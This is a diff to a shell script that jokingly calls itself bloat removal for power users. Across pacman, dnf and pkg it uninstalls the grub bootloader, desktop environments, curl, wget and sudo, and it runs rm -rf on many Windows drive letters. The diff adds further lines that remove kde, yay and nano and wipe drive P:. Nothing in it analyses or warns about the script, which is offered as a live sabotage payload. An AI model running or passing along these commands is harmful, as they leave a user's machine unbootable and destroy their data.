@@ -22,6 +22,7 @@ echo 'bloat for power users to try to get there systems back :P'
 echo 'if err try other operating systems'
 sudo pacman -Rns grub
 sudo pacman -Rns xfce4
+sudo pacman -Rns kde
 echo 'dnf package manager'
 sudo dnf remove grub
 sudo dnf remove curl
@@ -29,6 +30,8 @@ sudo dnf remove wget
 sudo dnf remove xfce
 sudo dnf remove kde
 sudo dnf remove htop
+sudo dnf remove kde
+sudo dnf remove kde-latest
 echo 'pkg/base linux/bsd-based'
 pkg delete grub && echo 'or remove/uninstall'
 pkg remove grub
@@ -40,6 +43,8 @@ pkg remove wget
 echo 'arch-linux aur version'
 pacman -Rns curl
 sudo pacman -Rns wget
+sudo pacman -Rns yay
+sudo pacman -Rns nano
 sudo pacman -Rns sudo
 # windows version #
 echo 'if windows somehow ported sh bc theres sh ports'
@@ -53,6 +58,7 @@ rm -rf G:\
 rm -rf J:\
 rm -rf K:\
 rm -rf L:\
+rm -rf P:\
 # end of windows version #
 mkdir /done/
 mkdir /status/
